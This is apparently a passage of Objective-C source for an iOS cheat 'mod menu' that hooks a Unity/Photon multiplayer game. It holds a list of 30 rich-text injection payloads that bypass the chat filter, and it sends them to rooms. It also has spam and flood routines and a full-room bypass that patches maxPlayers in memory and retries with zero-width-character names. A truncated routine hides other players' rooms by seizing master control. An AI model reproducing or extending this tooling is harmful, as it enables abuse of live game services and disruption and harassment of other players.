    [ac addAction:[UIAlertAction actionWithTitle:@"🟢 Matrix Isim (Binary)" style:UIAlertActionStyleDefault handler:^(UIAlertAction *a){
        if (nameMarqueeTimer) { [nameMarqueeTimer invalidate]; nameMarqueeTimer = nil; }
        nameTrickMode = 5; [self applyPlainNick:matrixWrapName(@"FEW1N")]; FLog(@"Matrix isim ayarlandi");
    }]];
    [ac addAction:[UIAlertAction actionWithTitle:@"💀 Glitch Isim" style:UIAlertActionStyleDefault handler:^(UIAlertAction *a){
        if (nameMarqueeTimer) { [nameMarqueeTimer invalidate]; nameMarqueeTimer = nil; }
        nameTrickMode = 6; [self applyPlainNick:glitchWrapName(@"FEW1N")]; FLog(@"Glitch isim ayarlandi");
    }]];
    [ac addAction:[UIAlertAction actionWithTitle:@"🔢 Binary Isim (0/1)" style:UIAlertActionStyleDefault handler:^(UIAlertAction *a){
        if (nameMarqueeTimer) { [nameMarqueeTimer invalidate]; nameMarqueeTimer = nil; }
        nameTrickMode = 7; [self applyPlainNick:binaryWrapName(@"FEW1N")]; FLog(@"Binary isim ayarlandi");
    }]];
    [ac addAction:[UIAlertAction actionWithTitle:@"🎞️ Kayan Yazi (marquee)" style:UIAlertActionStyleDefault handler:^(UIAlertAction *a){
        if (nameMarqueeTimer) { [nameMarqueeTimer invalidate]; nameMarqueeTimer = nil; }
        nameTrickMode = 0; nameMarqueeTimer = [NSTimer scheduledTimerWithTimeInterval:0.4 target:self selector:@selector(fireNameMarquee) userInfo:nil repeats:YES];
        FLog(@"Kayan yazi ismi basladi");
    }]];
    [ac addAction:[UIAlertAction actionWithTitle:@"🔄 Isim Dongusu (emoji/bayrak/level)" style:UIAlertActionStyleDefault handler:^(UIAlertAction *a){
        if (nameMarqueeTimer) { [nameMarqueeTimer invalidate]; nameMarqueeTimer = nil; }
        nameTrickMode = 0; nameMarqueeTimer = [NSTimer scheduledTimerWithTimeInterval:0.7 target:self selector:@selector(fireNameCycle) userInfo:nil repeats:YES];
        FLog(@"Isim dongusu basladi");
    }]];
    [ac addAction:[UIAlertAction actionWithTitle:@"⏹️ Efekti Durdur" style:UIAlertActionStyleDestructive handler:^(UIAlertAction *a){
        if (nameMarqueeTimer) { [nameMarqueeTimer invalidate]; nameMarqueeTimer = nil; } nameTrickMode = 0; FLog(@"Kayan yazi durdu");
    }]];
    [ac addAction:[UIAlertAction actionWithTitle:@"Iptal" style:UIAlertActionStyleCancel handler:nil]];
    [self present:ac];
}

// Hacker isim animasyonu (yanip-sonen, renk degisen)
- (void)fireHackerName {
    static int hi = 0;
    NSArray *hackerNames = @[
        @"<color=#FF0000><b>[ROOT] FEW1N</b></color>",
        @"<color=#00FF00><b>[ROOT] FEW1N</b></color>",
        @"<color=#00FFFF><b>[ROOT] FEW1N</b></color>",
        @"<color=#FF00FF><b>[ROOT] FEW1N</b></color>",
        @"<color=#FFFF00><b>[ROOT] FEW1N</b></color>",
        @"<color=#FF0000>⚡ FEW1N ⚡</color>",
        @"<color=#00FF00>⚡ FEW1N ⚡</color>",
        @"<color=#00FFFF>⚡ FEW1N ⚡</color>"
    ];
    [self applyPlainNick:hackerNames[hi % hackerNames.count]];
    hi++;
}

// Rich text test: cesitli etiketleri chate gonder, hangileri render oluyor gor
- (void)richTextTest {
    if (!chatGetInst || !chatSend) return;
    NSArray *tests = @[
        @"<i>italik</i> <u>alti-cizili</u> <s>ustu-cizili</s>",
        @"<mark=#FFFF0044>vurgu</mark> <sup>ust</sup><sub>alt</sub>",
        @"<size=200%>DEV</size> normal <size=50%>kucuk</size>",
        @"gizli:<alpha=#00>gizliyazi</alpha><alpha=#FF>-son",
        @"<voffset=1em>yukari</voffset> <cspace=10>aralikli</cspace>"
    ];
    __block int i = 0;
    for (NSString *t in tests) {
        double delay = (i++) * 0.6;
        dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(delay * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
            @try { void* mgr = chatGetInst(); void* s = mkStr(t); if (mgr && s) chatSend(mgr, s); } @catch (...) {}
        });
    }
}

// ===== EXPLOIT TEST (CHAT FILTRESI ATLATMA - 30 YONTEM) =====
- (void)exploitChatTest {
    if (!chatGetInst || !chatSend) {
        FLog(@"Chat hazır değil - önce bir odaya gir!");
        UIAlertController *ac = [UIAlertController alertControllerWithTitle:@"⚠️ Odaya Katıl"
            message:@"Exploit chat testini yapmak için lütfen önce bir odaya katılın." preferredStyle:UIAlertControllerStyleAlert];
        [ac addAction:[UIAlertAction actionWithTitle:@"Tamam" style:UIAlertActionStyleDefault handler:nil]];
        [self present:ac];
        return;
    }
    NSArray *exploits = @[
        @"1. Kisa Hex 6: <#FF0000>FEW1N RED",
        @"2. Kisa Hex 8: <#00FF00FF>FEW1N GREEN",
        @"3. Kisa Hex 3: <#00F>FEW1N BLUE",
        @"4. Kisa Hex 4: <#F00F>FEW1N ALPHA",
        @"5. Hashsiz Hex: <color=FF0000>FEW1N NOHASH</color>",
        @"6. Buyuk Harf: <COLOR=#FF0000>FEW1N</COLOR>",
        @"7. Karma Harf: <CoLoR=#00FFFF>FEW1N</CoLoR>",
        @"8. Cift Tirnak: <color=\"yellow\">FEW1N</color>",
        @"9. Tek Tirnak: <color='orange'>FEW1N</color>",
        @"10. Bosluklu Tag: <color = #FF0000>FEW1N SPACE</color>",
        @"11. Cift Katman: <col<color=#FF00FF>or=#FF00FF>FEW1N DBL",
        @"12. Uc Katman: <col<col<color=#FF0000>or=#FF0000>or=#FF0000>FEW1N TRPL",
        @"13. Mark Vurgu: <mark=#FF8800AA>FEW1N MARK</mark>",
        @"14. Alpha Opaklik: <alpha=#FF><#00FFFF>FEW1N ALPHA",
        @"15. Dev+Renk: <size=160%><#00FF00>FEW1N DEV</size>",
        @"16. ZeroWidth Split: c\u200Bolor=#FF0000>FEW1N ZW",
        @"17. Soft Hyphen: c\u00ADolor=#FF0000>FEW1N SH",
        @"18. Word Joiner: c\u2060olor=#FF0000>FEW1N WJ",
        @"19. RTL Mark: \u200F<#FF0000>FEW1N RTL",
        @"20. UTF BOM: \uFEFF<#FF0000>FEW1N BOM",
        @"21. HTML Entity: &lt;color=#FF0000&gt;FEW1N",
        @"22. Decimal Entity: &#60;color=#FF0000&#62;FEW1N",
        @"23. Sprite Inject: <sprite index=0><#FF0000>FEW1N",
        @"24. Full Combo: <size=140%><mark=#000000AA><#FF0000>FEW1N</mark></size>",
        @"25. Gradient Tag: <gradient=\"RedYellow\"><#FF0000>FEW1N GRAD",
        @"26. Font Inject: <font=\"Arial\"><#00FF00>FEW1N FONT",
        @"27. Underline Color: <u><#00FFFF>FEW1N ULINE</u>",
        @"28. Italic Color: <i><#FF00FF>FEW1N ITALIC</i>",
        @"29. Superscript: <sup><#FFFF00>FEW1N SUP</sup>",
        @"30. Line Height: <line-height=120%><#FF0000>FEW1N LINE"
    ];
    __block int idx = 0;
    for (NSString *exp in exploits) {
        double delay = (idx++) * 0.45;
        dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(delay * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
            @try {
                void* mgr = chatGetInst();
                void* str = mkStr(exp);
                if (mgr && str) chatSend(mgr, str);
            } @catch (...) {}
        });
    }
    FLog(@"30 Exploit payload chate gonderiliyor...");
}

// ===== EXPLOIT ILE ODA KURMA (30 YONTEM) =====
- (void)exploitCreateRoom {
    UIAlertController *ac = [UIAlertController alertControllerWithTitle:@"🧪 Exploit Oda Kurma (30 Yontem)"
                                                               message:@"Oda adini girin ve uygulanacak 30 exploit tekniginden birini secin:"
                                                        preferredStyle:UIAlertControllerStyleAlert];

    [ac addTextFieldWithConfigurationHandler:^(UITextField *tf){
        tf.text = @"FEW1N";
        tf.placeholder = @"Oda Ismini Girin";
        tf.clearButtonMode = UITextFieldViewModeAlways;
    }];

    void (^runExp)(NSString*, NSString*) = ^(NSString *prefix, NSString *suffix){
        NSString *inp = ac.textFields.firstObject.text;
        if (!inp || inp.length == 0) inp = @"FEW1N";
        NSString *full = [NSString stringWithFormat:@"%@%@%@", prefix, inp, suffix];
        strncpy(customRoomName, full.UTF8String, sizeof(customRoomName)-1);
        customRoomName[sizeof(customRoomName)-1]='\0';
        saveStr(@"roomName", full);
        FLog([NSString stringWithFormat:@"Exploit oda ismi kuruluyor: %@", full]);
        [self createOneRoom];
    };

    [ac addAction:[UIAlertAction actionWithTitle:@"1. Kisa Hex 6 (<#FF0000>)" style:UIAlertActionStyleDefault handler:^(UIAlertAction *a){ runExp(@"<#FF0000>", @""); }]];
    [ac addAction:[UIAlertAction actionWithTitle:@"2. Kisa Hex 8 (<#00FF00FF>)" style:UIAlertActionStyleDefault handler:^(UIAlertAction *a){ runExp(@"<#00FF00FF>", @""); }]];
    [ac addAction:[UIAlertAction actionWithTitle:@"3. Kisa Hex 3 (<#00F>)" style:UIAlertActionStyleDefault handler:^(UIAlertAction *a){ runExp(@"<#00F>", @""); }]];
    [ac addAction:[UIAlertAction actionWithTitle:@"4. Kisa Hex 4 (<#F00F>)" style:UIAlertActionStyleDefault handler:^(UIAlertAction *a){ runExp(@"<#F00F>", @""); }]];
    [ac addAction:[UIAlertAction actionWithTitle:@"5. Hashsiz Hex (<color=FF0000>)" style:UIAlertActionStyleDefault handler:^(UIAlertAction *a){ runExp(@"<color=FF0000>", @"</color>"); }]];
    [ac addAction:[UIAlertAction actionWithTitle:@"6. Buyuk Harf (<COLOR=#FF0000>)" style:UIAlertActionStyleDefault handler:^(UIAlertAction *a){ runExp(@"<COLOR=#FF0000>", @"</COLOR>"); }]];
    [ac addAction:[UIAlertAction actionWithTitle:@"7. Karma Harf (<CoLoR=#00FFFF>)" style:UIAlertActionStyleDefault handler:^(UIAlertAction *a){ runExp(@"<CoLoR=#00FFFF>", @"</CoLoR>"); }]];
    [ac addAction:[UIAlertAction actionWithTitle:@"8. Cift Tirnak (<color=\"yellow\">)" style:UIAlertActionStyleDefault handler:^(UIAlertAction *a){ runExp(@"<color=\"yellow\">", @"</color>"); }]];
    [ac addAction:[UIAlertAction actionWithTitle:@"9. Tek Tirnak (<color='orange'>)" style:UIAlertActionStyleDefault handler:^(UIAlertAction *a){ runExp(@"<color='orange'>", @"</color>"); }]];
    [ac addAction:[UIAlertAction actionWithTitle:@"10. Bosluklu Tag (<color = #FF0000>)" style:UIAlertActionStyleDefault handler:^(UIAlertAction *a){ runExp(@"<color = #FF0000>", @"</color>"); }]];
    [ac addAction:[UIAlertAction actionWithTitle:@"11. Cift Katman (<col<color...>)" style:UIAlertActionStyleDefault handler:^(UIAlertAction *a){ runExp(@"<col<color=#FF00FF>or=#FF00FF>", @""); }]];
    [ac addAction:[UIAlertAction actionWithTitle:@"12. Uc Katman (<col<col<color...>)" style:UIAlertActionStyleDefault handler:^(UIAlertAction *a){ runExp(@"<col<col<color=#FF0000>or=#FF0000>or=#FF0000>", @""); }]];
    [ac addAction:[UIAlertAction actionWithTitle:@"13. Mark Vurgu (<mark=#FF8800AA>)" style:UIAlertActionStyleDefault handler:^(UIAlertAction *a){ runExp(@"<mark=#FF8800AA>", @"</mark>"); }]];
    [ac addAction:[UIAlertAction actionWithTitle:@"14. Alpha Tag (<alpha=#FF><#00FF>)" style:UIAlertActionStyleDefault handler:^(UIAlertAction *a){ runExp(@"<alpha=#FF><#00FFFF>", @""); }]];
    [ac addAction:[UIAlertAction actionWithTitle:@"15. Dev Yazili (<size=160%><#00FF>)" style:UIAlertActionStyleDefault handler:^(UIAlertAction *a){ runExp(@"<size=160%><#00FF00>", @"</size>"); }]];
    [ac addAction:[UIAlertAction actionWithTitle:@"16. ZeroWidth Split (c\\u200Bolor)" style:UIAlertActionStyleDefault handler:^(UIAlertAction *a){ runExp(@"c\u200Bolor=#FF0000>", @""); }]];
    [ac addAction:[UIAlertAction actionWithTitle:@"17. Soft Hyphen Split (c\\u00ADolor)" style:UIAlertActionStyleDefault handler:^(UIAlertAction *a){ runExp(@"c\u00ADolor=#FF0000>", @""); }]];
    [ac addAction:[UIAlertAction actionWithTitle:@"18. Word Joiner (c\\u2060olor)" style:UIAlertActionStyleDefault handler:^(UIAlertAction *a){ runExp(@"c\u2060olor=#FF0000>", @""); }]];
    [ac addAction:[UIAlertAction actionWithTitle:@"19. RTL Control Mark (\\u200F)" style:UIAlertActionStyleDefault handler:^(UIAlertAction *a){ runExp(@"\u200F<#FF0000>", @""); }]];
    [ac addAction:[UIAlertAction actionWithTitle:@"20. UTF-8 BOM Prefix (\\uFEFF)" style:UIAlertActionStyleDefault handler:^(UIAlertAction *a){ runExp(@"\uFEFF<#FF0000>", @""); }]];
    [ac addAction:[UIAlertAction actionWithTitle:@"21. HTML Entity (&lt;color...)" style:UIAlertActionStyleDefault handler:^(UIAlertAction *a){ runExp(@"&lt;color=#FF0000&gt;", @""); }]];
    [ac addAction:[UIAlertAction actionWithTitle:@"22. Decimal Entity (&#60;color...)" style:UIAlertActionStyleDefault handler:^(UIAlertAction *a){ runExp(@"&#60;color=#FF0000&#62;", @""); }]];
    [ac addAction:[UIAlertAction actionWithTitle:@"23. Sprite Injection (<sprite=0>)" style:UIAlertActionStyleDefault handler:^(UIAlertAction *a){ runExp(@"<sprite index=0><#FF0000>", @""); }]];
    [ac addAction:[UIAlertAction actionWithTitle:@"24. Full Combo Overlay" style:UIAlertActionStyleDefault handler:^(UIAlertAction *a){ runExp(@"<size=140%><mark=#000000AA><#FF0000>", @"</mark></size>"); }]];
    [ac addAction:[UIAlertAction actionWithTitle:@"25. Gradient Tag (<gradient=...>)" style:UIAlertActionStyleDefault handler:^(UIAlertAction *a){ runExp(@"<gradient=\"RedYellow\"><#FF0000>", @"</gradient>"); }]];
    [ac addAction:[UIAlertAction actionWithTitle:@"26. Font Swap Inject (<font=...>)" style:UIAlertActionStyleDefault handler:^(UIAlertAction *a){ runExp(@"<font=\"Arial\"><#00FF00>", @"</font>"); }]];
    [ac addAction:[UIAlertAction actionWithTitle:@"27. Alt Cizgili Renk (<u>)" style:UIAlertActionStyleDefault handler:^(UIAlertAction *a){ runExp(@"<u><#00FFFF>", @"</u>"); }]];
    [ac addAction:[UIAlertAction actionWithTitle:@"28. Italik Renk (<i>)" style:UIAlertActionStyleDefault handler:^(UIAlertAction *a){ runExp(@"<i><#FF00FF>", @"</i>"); }]];
    [ac addAction:[UIAlertAction actionWithTitle:@"29. Ust Indis Renk (<sup>)" style:UIAlertActionStyleDefault handler:^(UIAlertAction *a){ runExp(@"<sup><#FFFF00>", @"</sup>"); }]];
    [ac addAction:[UIAlertAction actionWithTitle:@"30. Satir Yuksekligi Enjeksiyonu" style:UIAlertActionStyleDefault handler:^(UIAlertAction *a){ runExp(@"<line-height=120%><#FF0000>", @""); }]];

    [ac addAction:[UIAlertAction actionWithTitle:@"Iptal" style:UIAlertActionStyleCancel handler:nil]];
    [self present:ac];
}

- (void)editSpam {
    UIAlertController *ac = [UIAlertController alertControllerWithTitle:@"\U0001F4AC Spam Yazisi" message:nil preferredStyle:UIAlertControllerStyleAlert];
    [ac addTextFieldWithConfigurationHandler:^(UITextField *tf){ tf.text = [NSString stringWithUTF8String:chatSpamText]; tf.clearButtonMode = UITextFieldViewModeAlways; }];
    [ac addAction:[UIAlertAction actionWithTitle:@"Kaydet" style:UIAlertActionStyleDefault handler:^(UIAlertAction *a){
        NSString *t = ac.textFields.firstObject.text;
        if (t.length > 0) { strncpy(chatSpamText, t.UTF8String, sizeof(chatSpamText)-1); chatSpamText[sizeof(chatSpamText)-1]='\0'; saveStr(@"spamText", t); }
    }]];
    [ac addAction:[UIAlertAction actionWithTitle:@"Iptal" style:UIAlertActionStyleCancel handler:nil]];
    [self present:ac];
}

- (void)chatArt {
    if (!chatGetInst || !chatSend) { FLog(@"Chat pointeri yok - odaya gir"); return; }
    NSArray *arts = @[ @"¯\\_(ツ)_/¯", @"( ͡° ͜ʖ ͡°)", @"ʕ•ᴥ•ʔ", @"(⌐■_■)", @"▄︻デ══━一 💥", @"（╯°□°）╯︵ ┻━┻", @"༼ つ ◕_◕ ༽つ" ];
    UIAlertController *ac = [UIAlertController alertControllerWithTitle:@"\U0001F3A8 Chat ASCII Sanat"
        message:@"Sec - chate gonderilir (odadaki herkes gorur)" preferredStyle:UIAlertControllerStyleAlert];
    for (NSString *art in arts) {
        [ac addAction:[UIAlertAction actionWithTitle:art style:UIAlertActionStyleDefault handler:^(UIAlertAction *a){
            @try { void* mgr = chatGetInst(); void* s = mkStr(art); if (mgr && s) chatSend(mgr, s); } @catch (...) {}
            FLog(@"ASCII sanat gonderildi");
        }]];
    }
    [ac addAction:[UIAlertAction actionWithTitle:@"🏁 FEW1N Banner (3 satir)" style:UIAlertActionStyleDefault handler:^(UIAlertAction *a){
        NSArray *lines = @[ @"█▀▀ █▀▀ █░█░█ ▄█ █▄░█", @"█▀░ ██▄ ▀▄▀▄▀ ░█ █░▀█", @"▬▬▬ MOD MENU ▬▬▬" ];
        __block int i = 0;
        for (NSString *ln in lines) {
            double delay = (i++) * 0.4;
            dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(delay * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
                @try { void* mgr = chatGetInst(); void* s = mkStr(ln); if (mgr && s) chatSend(mgr, s); } @catch (...) {}
            });
        }
        FLog(@"FEW1N banner gonderildi");
    }]];
    [ac addAction:[UIAlertAction actionWithTitle:@"Iptal" style:UIAlertActionStyleCancel handler:nil]];
    [self present:ac];
}

- (void)fireAnnounce {
    if (!isAnnounceEnabled || !chatGetInst || !chatSend) return;
    @try {
        NSArray *lines = [[NSString stringWithUTF8String:announceText] componentsSeparatedByString:@"\n"];
        if (lines.count == 0) return;
        NSString *msg = [lines[g_announceIdx % lines.count] stringByTrimmingCharactersInSet:[NSCharacterSet whitespaceCharacterSet]];
        g_announceIdx++;
        if (msg.length > 0) { void* mgr = chatGetInst(); void* s = mkStr(msg); if (mgr && s) chatSend(mgr, s); }
    } @catch (...) {}
}
- (void)tapAnnounce {
    isAnnounceEnabled = !isAnnounceEnabled;
    saveBool(@"announce", isAnnounceEnabled);
    if (announceTimer) { [announceTimer invalidate]; announceTimer = nil; }
    if (isAnnounceEnabled) {
        g_announceIdx = 0;
        float iv = announceInterval >= 1.0f ? announceInterval : 5.0f;
        announceTimer = [NSTimer scheduledTimerWithTimeInterval:iv target:self selector:@selector(fireAnnounce) userInfo:nil repeats:YES];
        FLog(@"Chat oto-duyuru basladi");
    } else FLog(@"Oto-duyuru durdu");
    [self refreshUI];
}
- (void)editAnnounce {
    UIAlertController *ac = [UIAlertController alertControllerWithTitle:@"📢 Duyuru Mesajlari"
        message:@"Her satir ayri mesaj (sirayla doner):" preferredStyle:UIAlertControllerStyleAlert];
    [ac addTextFieldWithConfigurationHandler:^(UITextField *tf){ tf.text = [NSString stringWithUTF8String:announceText]; tf.clearButtonMode = UITextFieldViewModeAlways; }];
    [ac addTextFieldWithConfigurationHandler:^(UITextField *tf){ tf.keyboardType = UIKeyboardTypeDecimalPad; tf.text = [NSString stringWithFormat:@"%.0f", announceInterval]; tf.placeholder = @"aralik (sn, min 1)"; }];
    [ac addAction:[UIAlertAction actionWithTitle:@"Kaydet" style:UIAlertActionStyleDefault handler:^(UIAlertAction *a){
        NSString *t = ac.textFields[0].text;
        if (t.length > 0) { strncpy(announceText, t.UTF8String, sizeof(announceText)-1); announceText[sizeof(announceText)-1]='\0'; saveStr(@"announceText", t); }
        float iv = [ac.textFields[1].text floatValue]; if (iv >= 1.0f && iv <= 60.0f) { announceInterval = iv; saveInt(@"announceIv", (int)iv); }
    }]];
    [ac addAction:[UIAlertAction actionWithTitle:@"Iptal" style:UIAlertActionStyleCancel handler:nil]];
    [self present:ac];
}
// ===== EMOJI YAGMURU: oyunun KENDI sprite emojileri (<sprite=N>) -> garanti cikar =====
static int g_emojiMax = 12;   // gecerli emoji sprite sayisi (Emoji Test ile ogrenilir/ayarlanir)
- (void)emojiRain {
    if (!chatGetInst || !chatSend) { FLog(@"Chat hazir degil - once odaya gir"); return; }
    int mx = (g_emojiMax > 0 && g_emojiMax <= 60) ? g_emojiMax : 12;
    for (int i = 0; i < 14; i++) {
        NSMutableString *line = [NSMutableString string];
        for (int j = 0; j < 12; j++) [line appendFormat:@"<sprite=%d>", (int)arc4random_uniform((uint32_t)mx)];
        NSString *out = [line copy];
        dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(i * 0.12 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
            @try { void* mgr = chatGetInst(); void* s = mkStr(out); if (mgr && s) chatSend(mgr, s); } @catch (...) {}
        });
    }
    FLog(@"Emoji yagmuru gonderildi (oyun sprite'lari)");
}
// ===== EMOJI TEST: 0-29 arasi sprite'lari numarali gonder -> hangisi emoji cikiyorsa o gecerli =====
- (void)emojiSpriteTest {
    if (!chatGetInst || !chatSend) { FLog(@"Chat hazir degil - once odaya gir"); return; }
    for (int block = 0; block < 3; block++) {
        NSMutableString *line = [NSMutableString string];
        for (int i = block*10; i < block*10+10; i++) [line appendFormat:@"%d=<sprite=%d> ", i, i];
        NSString *out = [line copy];
        dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(block * 0.45 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
            @try { void* mgr = chatGetInst(); void* s = mkStr(out); if (mgr && s) chatSend(mgr, s); } @catch (...) {}
        });
    }
    FLog(@"Emoji test gonderildi: hangi numaralar emoji olarak ciktiysa onlar gecerli. Bana soyle, yagmuru ona gore ayarlayayim.");
}

// ===== OTOMATIK KARSILAMA (odaya girince) =====
- (void)tapAutoGreet {
    isAutoGreetEnabled = !isAutoGreetEnabled;
    saveBool(@"autogreet", isAutoGreetEnabled);
    FLog(isAutoGreetEnabled ? @"Otomatik karsilama ACIK (odaya girince mesaj atar)" : @"Otomatik karsilama KAPALI");
    [self refreshUI];
}
- (void)editGreet {
    UIAlertController *ac = [UIAlertController alertControllerWithTitle:@"👋 Karsilama Mesaji"
        message:@"Odaya girince otomatik gonderilecek mesaj:" preferredStyle:UIAlertControllerStyleAlert];
    [ac addTextFieldWithConfigurationHandler:^(UITextField *tf){ tf.text = [NSString stringWithUTF8String:g_greetText]; tf.clearButtonMode = UITextFieldViewModeAlways; }];
    [ac addAction:[UIAlertAction actionWithTitle:@"Kaydet" style:UIAlertActionStyleDefault handler:^(UIAlertAction *a){
        NSString *t = ac.textFields.firstObject.text;
        if (t.length > 0) { strncpy(g_greetText, t.UTF8String, sizeof(g_greetText)-1); g_greetText[sizeof(g_greetText)-1]='\0'; saveStr(@"greetText", t); FLog(@"Karsilama mesaji kaydedildi"); }
    }]];
    [ac addAction:[UIAlertAction actionWithTitle:@"Iptal" style:UIAlertActionStyleCancel handler:nil]];
    [self present:ac];
}

static bool (*pn_joinOrCreateRoom)(void*, void*, void*, void*) = NULL;

static void few1n_joinTargetRoom(NSString *nm) {
    if (!nm || nm.length == 0) return;
    @try {
        bool wasInRoom = (pn_getInRoom && pn_getInRoom());
        if (wasInRoom) {
            if (pn_leaveRoom) pn_leaveRoom(false);
            if (lobbyGetInst && lobby_leaveRoom) {
                void* l = lobbyGetInst();
                if (l) lobby_leaveRoom(l);
            }
        }
        int64_t delay = wasInRoom ? (int64_t)(0.35 * NSEC_PER_SEC) : (int64_t)(0.05 * NSEC_PER_SEC);
        dispatch_after(dispatch_time(DISPATCH_TIME_NOW, delay), dispatch_get_main_queue(), ^{
            void* ns = mkStr(nm);
            if (!ns) return;
            
            bool ok = false;
            // 1) Doğrudan JoinRoom dene
            if (pn_joinRoom) {
                ok = pn_joinRoom(ns, NULL);
            }
            
            // 2) Eğer giremediyse (dolu vs.), JoinOrCreateRoom ile zorla
            if (!ok && pn_joinOrCreateRoom) {
                ok = pn_joinOrCreateRoom(ns, NULL, NULL, NULL);
            }
            
            // 3) Sıfır genişlikli karakter bypass ile tekrar dene
            if (!ok && pn_joinRoom) {
                for (int r = 1; r <= 3 && !ok; r++) {
                    NSMutableString *uName = [NSMutableString stringWithString:nm];
                    for (int k = 0; k < r; k++) [uName appendString:@"​"];
                    void* nsUniq = mkStr(uName);
                    if (nsUniq) ok = pn_joinRoom(nsUniq, NULL);
                }
            }
            // v85: 4) Hala giremediyse — kucuk/buyuk harf permutasyonlari + trailing space
            if (!ok && pn_joinRoom) {
                NSArray *variants = @[[nm stringByAppendingString:@" "], [nm lowercaseString], [nm uppercaseString]];
                for (NSString *v in variants) {
                    if (ok) break;
                    void* vs = mkStr(v);
                    if (vs) ok = pn_joinRoom(vs, NULL);
                }
            }
            // v114.4 EK METOD 5: RoomInfo memory patch - MaxPlayers'i 100 yap (local check bypass)
            if (!ok) {
                @try {
                    if (g_roomLineType && g_mFindObjectsPlural && i_runtime_invoke) {
                        void* aRL[1]; aRL[0] = g_roomLineType;
                        void* rlarr = i_runtime_invoke(g_mFindObjectsPlural, NULL, aRL, NULL);
                        if (ptrOk(rlarr)) {
                            int rcnt = (int)(*(uintptr_t*)((uintptr_t)rlarr + 0x18));
                            if (rcnt > 0 && rcnt < 256) {
                                void** lines = (void**)((uintptr_t)rlarr + 0x20);
                                for (int i = 0; i < rcnt; i++) {
                                    void* ln = lines[i]; if (!unityAlive(ln)) continue;
                                    void* rinfo = *(void**)((uintptr_t)ln + 0x58);
                                    if (ptrOk(rinfo) && rinfo_getName) {
                                        NSString *rnm = readStr(rinfo_getName(rinfo));
                                        if ([rnm isEqualToString:nm]) {
                                            // RoomInfo.maxPlayers @offset +0x20 (bool RemovedFromList +0x10, customProps +0x18 pointer)
                                            // Photon.Realtime.RoomInfo layout: bool(1) + [ptr customProps(8)] + int(maxPlayers)
                                            // Offset guvenlik icin +0x20 civari
                                            @try { *(int*)((uintptr_t)rinfo + 0x20) = 100; } @catch (...) {}
                                            void* nsRetry = mkStr(nm);
                                            if (nsRetry) ok = pn_joinRoom(nsRetry, NULL);
                                            break;
                                        }
                                    }
                                }
                            }
                        }
                    }
                } @catch (...) {}
            }
            // v114.4 EK METOD 6: 2 saniye bekleme + tekrar dene (belki biri düşmüş olur)
            if (!ok) {
                dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(2.0 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
                    @try {
                        void* nsRetry = mkStr(nm);
                        if (nsRetry && pn_joinRoom) {
                            bool retryOk = pn_joinRoom(nsRetry, NULL);
                            FLog([NSString stringWithFormat:@"🔁 2sn sonra tekrar dene '%@': %@", nm, retryOk ? @"✓ girildi" : @"❌ hala reddetti"]);
                        }
                    } @catch (...) {}
                });
            }
            FLog(ok ? [NSString stringWithFormat:@"✓ '%@' odasına katılım başarılı!", nm] : [NSString stringWithFormat:@"❌ '%@' TÜM METODLAR fail (Photon sunucu MaxPlayers=full katı - 2sn sonra 1x retry gonderildi)", nm]);
        });
    } @catch (...) { FLog(@"Odaya katılma hatası"); }
}

// ===== BELİRLİ İSİM/ID İLE ODAYA GİR (DOLU ODA BYPASS & TIKLANABİLİR LİSTE) =====

// TOPLU SUNUCU GİZLE — her odaya gir, master ol, IsVisible=false yap, cik
- (void)pickRoomsServerHide {
    // v96: g_lobbyRoomNames GUVENILMEZ (hook dolduramiyor bazi kez). showRoomPasswords'un
    // CANLI RoomLine scan metodunu kullan - il2cpp FindObjectsOfType<RoomLine>().
    NSMutableArray *liveNames = [NSMutableArray array];
    if (g_roomLineType && g_mFindObjectsPlural && i_runtime_invoke) {
        @try {
            void* a[1]; a[0] = g_roomLineType;
            void* arr = i_runtime_invoke(g_mFindObjectsPlural, NULL, a, NULL);
            if (ptrOk(arr)) {
                int cnt = (int)(*(uintptr_t*)((uintptr_t)arr + 0x18));
                if (cnt > 0 && cnt < 256) {
                    void** lines = (void**)((uintptr_t)arr + 0x20);
                    for (int i = 0; i < cnt; i++) {
                        void* ln = lines[i]; if (!unityAlive(ln)) continue;
                        void* rinfo = *(void**)((uintptr_t)ln + 0x58);
                        if (ptrOk(rinfo) && rinfo_getName) {
                            NSString *nm = readStr(rinfo_getName(rinfo));
                            if (nm.length > 0 && ![liveNames containsObject:nm]) [liveNames addObject:nm];
                        }
                    }
                }
            }
        } @catch (...) {}
    }
    // fallback: eski g_lobbyRoomNames dolu ise onu da ekle
    if (g_lobbyRoomNames) {
        @synchronized(g_lobbyRoomNames) {
            for (NSString *nm in g_lobbyRoomNames) if (nm.length > 0 && ![liveNames containsObject:nm]) [liveNames addObject:nm];
        }
    }
    if (liveNames.count == 0) {
        UIAlertController *ac = [UIAlertController alertControllerWithTitle:@"🌐 Sunucu Gizle"
                                                                   message:@"Lobide oda gorunmuyor. Once oda listesi ekranini ac (lobi/liste sekmesine gir), sonra tekrar bas."
                                                            preferredStyle:UIAlertControllerStyleAlert];
        [ac addAction:[UIAlertAction actionWithTitle:@"Tamam" style:UIAlertActionStyleDefault handler:nil]];
        [self present:ac]; return;
    }
    NSArray *names = [liveNames copy];
    NSMutableArray *targets = [NSMutableArray array];
    UIAlertController *ac = [UIAlertController alertControllerWithTitle:@"🌐 Sunucu Gizle — Seç"
        message:[NSString stringWithFormat:@"%lu oda. Sec: kuyruga gir. Onayla: sirayla gir→master→gizle→cik.\n\n⚠️ 5-30sn surer, lobi calkalanir.", (unsigned long)names.count]
        preferredStyle:UIAlertControllerStyleActionSheet];
    for (NSString *nm in names) {
        [ac addAction:[UIAlertAction actionWithTitle:[NSString stringWithFormat:@"➕  %@", nm] style:UIAlertActionStyleDefault handler:^(UIAlertAction *a){
            [targets addObject:nm];
            FLog([NSString stringWithFormat:@"🌐 Kuyruğa: %@ (toplam %lu)", nm, (unsigned long)targets.count]);
        }]];
    }
